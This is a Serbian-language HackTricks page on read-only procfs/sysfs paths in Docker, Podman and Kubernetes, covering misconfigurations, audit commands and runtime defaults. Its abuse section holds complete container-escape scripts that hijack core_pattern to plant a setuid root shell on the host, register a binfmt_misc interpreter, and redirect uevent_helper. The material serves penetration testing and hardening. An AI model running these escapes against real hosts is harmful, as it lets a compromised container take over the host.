# Sistemske putanje samo za čitanje

{{#include ../../../../banners/hacktricks-training.md}}

Sistemske putanje samo za čitanje predstavljaju zasebnu zaštitu u odnosu na maskirane putanje. Umesto potpunog skrivanja putanje, runtime je izlaže, ali je montira samo za čitanje. Ovo je uobičajeno za odabrane lokacije u procfs i sysfs, gde pristup za čitanje može biti prihvatljiv ili operativno neophodan, dok bi upis bio previše opasan.

Svrha je jednostavna: mnogi kernel interfejsi postaju mnogo opasniji kada su dostupni za upis. Montiranje samo za čitanje ne uklanja svu vrednost za reconnaissance, ali sprečava kompromitovani workload da menja osnovne kernel-facing fajlove kroz tu putanju.

## Rad

Runtime-i često označavaju delove proc/sys prikaza kao dostupne samo za čitanje. U zavisnosti od runtime-a i hosta, to može uključivati putanje kao što su:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Stvarna lista se razlikuje, ali model je isti: omogućiti vidljivost tamo gde je potrebna, a podrazumevano onemogućiti izmene.<sup>[[1]](#references)</sup>

## Lab

Proverite listu putanja samo za čitanje koju Docker deklariše:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Pregledajte montirani proc/sys prikaz iz kontejnera:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Bezbednosni uticaj

Putanje sistema samo za čitanje ograničavaju veliki broj zloupotreba koje utiču na host. Čak i kada napadač može da pregleda procfs ili sysfs, nemogućnost upisivanja u njih uklanja mnoge direktne puteve za izmene koje uključuju kernel tunables, crash handlers, pomoćne programe za učitavanje modula ili druge kontrolne interfejse. Izloženost nije uklonjena, ali prelazak od otkrivanja informacija do uticaja na host postaje teži.

## Pogrešne konfiguracije

Najčešće greške su uklanjanje maskiranja ili ponovno montiranje osetljivih putanja sa dozvolom za čitanje i pisanje, direktno izlaganje sadržaja host proc/sys pomoću writable bind mount-ova ili korišćenje privileged režima koji praktično zaobilaze bezbednije podrazumevane vrednosti runtime-a. U Kubernetes-u, `procMount: Unmasked` i privileged workload-ovi često se pojavljuju zajedno sa slabijom proc zaštitom.<sup>[[2]](#references)</sup> Još jedna česta operativna greška jeste pretpostavka da svi workload-ovi i dalje nasleđuju tu podrazumevanu vrednost samo zato što runtime obično montira ove putanje samo za čitanje.

## Zloupotreba

Ako je zaštita slaba, počnite traženjem proc/sys unosa u koje je moguće upisivati:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Kada postoje stavke u koje je moguće upisivati, vredne follow-up putanje uključuju:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Šta ove komande mogu otkriti:

- Writable entries under `/proc/sys` često znače da container može da menja ponašanje host kernel-a, a ne samo da ga pregleda.
- `core_pattern` je posebno važan zato što writable vrednost koja je dostupna host-u može da se pretvori u putanju za izvršavanje koda na host-u, izazivanjem pada procesa nakon postavljanja pipe handler-a.
- `modprobe` otkriva helper koji kernel koristi za tokove povezane sa učitavanjem modula; to je klasična high-value meta kada je writable.
- `binfmt_misc` pokazuje da li je moguća registracija custom interpreter-a. Ako je registracija writable, ovo može postati execution primitive, a ne samo information leak.
- `panic_on_oom` kontroliše kernel odluku koja važi za ceo host i zato iscrpljivanje resursa može pretvoriti u denial of service na host-u.
- `uevent_helper` je jedan od najjasnijih primera gde writable sysfs helper path omogućava izvršavanje u host kontekstu.

Zanimljivi nalazi obuhvataju writable host-facing proc knobs ili sysfs entries koji bi po pravilu trebalo da budu read-only. U tom trenutku, workload se pomera od ograničenog container prikaza ka značajnom uticaju na kernel.

### Potpun primer: `core_pattern` Host Escape

Ako je `/proc/sys/kernel/core_pattern` writable iz container-a i pokazuje na host kernel view, može se zloupotrebiti za izvršavanje payload-a nakon crash-a:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Ako putanja zaista doseže host kernel, payload se izvršava na hostu i ostavlja setuid shell.

### Potpun primer: `binfmt_misc` registracija

Ako je `/proc/sys/fs/binfmt_misc/register` upisiv, custom interpreter registration može da omogući code execution kada se izvrši odgovarajuća datoteka:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Na hostu dostupnom, upisivom `binfmt_misc` fajl-sistemu, rezultat je izvršavanje koda u putanji interpretera koju pokreće kernel.

### Potpun primer: `uevent_helper`

Ako je `/sys/kernel/uevent_helper` upisiv, kernel može pozvati pomoćni program sa host putanje kada se pokrene odgovarajući događaj:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Razlog zbog kog je ovo toliko opasno jeste to što se putanja helper-a razrešava iz perspektive filesystem-a hosta, a ne iz bezbednog konteksta koji obuhvata samo container.

## Provere

Ove provere utvrđuju da li su procfs/sysfs izloženi samo za čitanje tamo gde se to očekuje i da li workload i dalje može da menja osetljive kernel interfejse.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Šta je ovde zanimljivo:

- Normalno hardened workload treba da izloži veoma malo writable proc/sys entries.
- Writable `/proc/sys` paths su često važniji od običnog read access-a.
- Ako runtime navodi da je path read-only, ali je u praksi writable, pažljivo proverite mount propagation, bind mounts i privilege settings.

## Podrazumevane vrednosti runtime-a

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Podrazumevano omogućeno | Docker definiše podrazumevanu read-only listu path-ova za osetljive proc entries | izlaganje host proc/sys mount-ova, `--privileged` |
| Podman | Podrazumevano omogućeno | Podman primenjuje podrazumevane read-only path-ove, osim ako se to eksplicitno ne ublaži | `--security-opt unmask=ALL`, široki host mount-ovi, `--privileged` |
| Kubernetes | Nasleđuje podrazumevane vrednosti runtime-a | Koristi underlying runtime read-only model path-ova, osim ako se ne oslabi putem Pod settings-a ili host mount-ova | `procMount: Unmasked`, privileged workload-i, writable host proc/sys mount-ovi |
| containerd / CRI-O under Kubernetes | Podrazumevana vrednost runtime-a | Obično se oslanja na OCI/runtime podrazumevane vrednosti | isto kao u Kubernetes redu; direktne promene runtime konfiguracije mogu oslabiti ovo ponašanje |

Ključna stvar je da su read-only system path-ovi obično prisutni kao podrazumevana vrednost runtime-a, ali ih je lako oslabiti pomoću privileged mode-ova ili host bind mount-ova.

## Reference

- [1] [OCI Runtime Specification: Linux Container Configuration (maskedPaths / readonlyPaths)](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md)
- [2] [Kubernetes API Reference: Pod v1 (SecurityContext.procMount)](https://kubernetes.io/docs/reference/kubernetes-api/workload-resources/pod-v1/)

{{#include ../../../../banners/hacktricks-training.md}}
